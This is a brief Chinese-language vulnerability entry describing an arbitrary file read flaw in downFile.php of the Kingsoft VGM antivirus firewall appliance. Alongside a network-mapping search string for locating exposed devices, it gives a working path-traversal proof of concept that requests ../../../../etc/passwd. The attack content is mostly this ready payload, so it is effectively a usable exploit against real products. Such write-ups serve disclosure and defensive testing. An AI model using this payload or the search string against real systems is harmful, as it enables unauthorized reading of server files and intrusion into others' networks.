# 金山 VGM防毒墙 downFile.php 任意文件读取漏洞

## 漏洞描述

金山 VGM防毒墙 downFile.php文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

<a-checkbox checked>金山 VGM防毒墙</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"金山VGM"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1649952941780-18a6aa75-45de-487e-bbf7-3fe231d7aec1.png)验证POC

```php
/downFile.php?filename=../../../../etc/passwd
```

![img](../../../.vuepress/public/img/1649953010512-03ef2560-62c5-4e06-8dd9-01650487c045.png)